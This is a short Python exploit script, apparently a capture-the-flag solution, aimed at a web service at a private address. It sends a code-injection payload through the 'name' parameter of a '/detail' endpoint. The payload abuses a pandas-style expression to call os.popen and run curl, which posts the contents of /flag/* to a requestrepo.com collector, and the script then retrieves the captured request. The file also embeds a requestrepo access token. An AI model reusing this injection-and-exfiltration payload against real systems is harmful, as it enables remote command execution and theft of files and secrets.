import httpx
import asyncio
from requestrepo import Requestrepo # pip install requestrepo
client = Requestrepo(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTg5NzI5NDQsImV4cCI6MTc2MTY1MTM0NCwic3ViZG9tYWluIjoidWJodG91bzQifQ.PaMdCUmamA8TCw2lo8DG6fa3WPKq7US7FrA5NibCK7Y", host="requestrepo.com", port=443, protocol="https")

print(client.subdomain) # ubhtouo4
print(client.domain) # ubhtouo4.requestrepo.com

import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <i>")
    sys.exit(1)
I = sys.argv[1]

URL = f"http://10.0.38.9:4000{I}"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

class API(BaseAPI):
    def detail(self, name: str):
        response = self.c.get(f"/detail", params={"name": name})
        return response

def main():
    api = API()
    res = api.detail(''' 'and @pd.io.common.os.popen('curl -X POST -d "flag=$(cat /flag/*)" -ipv4 http://''' + client.domain + ''' ') #''')
    # print(res.text)

    new_request = client.get_http_request()
    print(new_request)


if __name__ == "__main__":
    main()
